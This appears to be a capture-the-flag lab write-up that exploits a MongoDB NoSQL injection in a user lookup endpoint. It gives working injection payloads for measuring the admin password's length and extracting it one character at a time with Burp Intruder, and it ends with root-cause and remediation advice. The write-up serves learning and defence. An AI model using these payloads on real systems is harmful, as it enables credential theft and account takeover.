---
title: "NoSQL Injection — Dumping the Admin Password"
date: 2025-06-19
categories: [CTF, Web, Security]
tags: [nosqli, mongodb, authentication, web, ctf, access-control]
image:
  path: /assets/nosqli/cover.png
---

# 💉 NoSQL Injection — Admin Password Dump

## 1️⃣ Initial Enumeration

While testing the application, I discovered the following endpoint:

```shell

GET /user/lookup?user=wiener
```

![Desktop View](/assets/nosqli/1.png){: width="700" height="400" .normal }

The endpoint returned user information directly based on the `user` parameter.

⚠️ No authentication checks were enforced.

This immediately suggested a potential **IDOR / Access Control vulnerability**.

---

## 2️⃣ Access Control Weakness

By simply modifying the parameter:
```shell
GET /user/lookup?user=admin
```

The application returned information about the `admin` account.

![Desktop View](/assets/nosqli/2.png){: width="700" height="400" .normal }

🚨 This confirms a broken access control issue.

But the real question was:

> Can we manipulate the query logic itself?

---

## 3️⃣ Testing for NoSQL Injection

Since the backend was using MongoDB, I tested for **NoSQL Injection** by injecting JavaScript-style conditions.

### Injection Test
```shell
/user/lookup?user=admin' || '1'=='1
```

The application responded differently — confirming that our input was being evaluated inside a query context.

✅ NoSQL Injection confirmed.

---

## 4️⃣ Determining Password Length

To extract sensitive data, I needed to determine the password length first.

### Payload Used

```shell
/user/lookup?user=admin' && this.password.length>5 || 'x'=='y
```

![Desktop View](/assets/nosqli/3.png){: width="700" height="400" .normal }

If the condition evaluated to **true**, the user data was returned.
If **false**, an error or empty response appeared.

By adjusting the number:

this.password.length > X


I narrowed it down and discovered:

Password length = 8


---

## 5️⃣ Extracting the Password (Character by Character)

Now that the length was known, I brute-forced each character using:
```shell
/user/lookup?user=admin' && this.password[0]=='a' || 'x'=='y
```



The logic:

- If the character matched → valid response.
- If not → error response.

Using Burp Intruder, I iterated through:

- Index positions: 0 → 7
- Characters: a–z

Eventually, the full password was extracted:
![Desktop View](/assets/nosqli/4.png){: width="700" height="400" .normal }

```shell
fpsqqnkg
```

🔥 Admin credentials fully compromised.

---

## 🎯 Impact

This vulnerability allows attackers to:

- Enumerate database contents
- Extract administrator credentials
- Completely bypass authentication
- Gain full administrative control
- Compromise confidentiality and integrity

This is a **Critical Severity** issue.

---

## 🛡️ Root Cause

The application embedded user input directly into a MongoDB query without validation.

Instead of safely constructing queries like:

```js
db.users.find({ user: req.query.user })
```

It likely evaluated input dynamically, allowing injected conditions such 
as:
this.password.length > 5


This enabled full query manipulation.


✅ Recommendations
1️⃣ Input Validation & Sanitization
Never concatenate user input into queries.

Use strict schema validation (e.g., Mongoose schemas).

Disable server-side JavaScript execution in MongoDB if not required.

2️⃣ Enforce Proper Access Control
Restrict /user/lookup to authenticated users only.

Ensure users can only access their own data.

3️⃣ Secure Error Handling
Do not leak database behavior differences.

Return generic responses for failed conditions.

4️⃣ Monitoring & Detection
Log suspicious query patterns.

Detect repeated conditional probing.

Alert on enumeration attempts.


## HAPPY HACKING 😈